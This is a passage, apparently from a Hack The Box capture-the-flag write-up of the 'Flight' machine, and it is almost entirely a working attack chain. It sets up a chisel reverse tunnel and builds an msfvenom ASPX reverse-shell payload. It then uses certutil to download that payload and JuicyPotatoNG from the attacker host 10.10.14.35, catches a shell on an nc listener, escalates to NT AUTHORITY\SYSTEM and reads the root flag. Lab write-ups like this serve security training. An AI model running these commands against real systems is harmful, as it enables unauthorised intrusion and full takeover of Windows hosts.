C:\Users\C.Bum>.\chisel.exe client 10.10.14.35:8080 R:8000:0.0.0.0:8000
.\chisel.exe client 10.10.14.35:8080 R:8000:0.0.0.0:8000
```

Verify connection on Kali: `2023/02/03 14:41:42 server: session#1: tun: proxy#R:8000=>0.0.0.0:8000: Listening`

![image](https://github.com/user-attachments/assets/654ec13a-f7f0-4638-b529-0978e4e46630)

The site is on IIS:

```console
root@kali:~# nmap -p 8000 -A localhost
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 14:44 +08
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000045s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
8000/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Flight - Travel and Tour
| http-methods:
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.18 seconds
```

Checking the `inetpub` directory, there appears to be a `development` directory that hosts the page's resources:

```cmd
C:\inetpub>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1DF4-493D

 Directory of C:\inetpub

02/03/2023  05:42 AM    <DIR>          .
02/03/2023  05:42 AM    <DIR>          ..
09/22/2022  11:24 AM    <DIR>          custerr
02/03/2023  05:42 AM    <DIR>          development
09/22/2022  12:08 PM    <DIR>          history
09/22/2022  11:32 AM    <DIR>          logs
09/22/2022  11:24 AM    <DIR>          temp
09/22/2022  11:28 AM    <DIR>          wwwroot
               0 File(s)              0 bytes
               8 Dir(s)   5,121,347,584 bytes free

C:\inetpub>dir development
dir development
 Volume in drive C has no label.
 Volume Serial Number is 1DF4-493D

 Directory of C:\inetpub\development

02/03/2023  05:42 AM    <DIR>          .
02/03/2023  05:42 AM    <DIR>          ..
04/16/2018  01:23 PM             9,371 contact.html
02/03/2023  05:42 AM    <DIR>          css
02/03/2023  05:42 AM    <DIR>          fonts
02/03/2023  05:42 AM    <DIR>          img
04/16/2018  01:23 PM            45,949 index.html
02/03/2023  05:42 AM    <DIR>          js
               2 File(s)         55,320 bytes
               6 Dir(s)   5,121,347,584 bytes free
```

Generate `.aspx` payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.35 LPORT=4446 -f aspx -o /var/www/html/reverse.aspx`

Start listerner in Kali: rlwrap nc -nlvp `4446`

Download payload on target: `certutil.exe -urlcache -f -split http://10.10.14.35/reverse.aspx`

Browse to payload: `http://kali.vx:8000/reverse.aspx`

Verify shell hooked:

```cmd
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.187] 49938
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

Verify privileges:

```cmd
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege` privileges found, sufficient for Juicy Potato

Preprare [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) binaries on Kali:

```console
curl -LO https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
unzip JuicyPotatoNG.zip
mv JuicyPotatoNG.exe /var/www/html/
```

Download JuicyPotatoNG on target: `certutil.exe -urlcache -f -split http://10.10.14.35/JuicyPotatoNG.exe`

Execute:

```cmd
c:\windows\system32\inetsrv>cd C:\xampp\htdocs\flight.htb
cd C:\xampp\htdocs\flight.htb

C:\xampp\htdocs\flight.htb>certutil.exe -urlcache -f -split http://10.10.14.35/JuicyPotatoNG.exe
certutil.exe -urlcache -f -split http://10.10.14.35/JuicyPotatoNG.exe
****  Online  ****
  000000  ...
  025800
CertUtil: -URLCache command completed successfully.

C:\xampp\htdocs\flight.htb>.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -i
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -i
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system

C:\>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
a8e183167b3ae625440ec644950f1b84
```
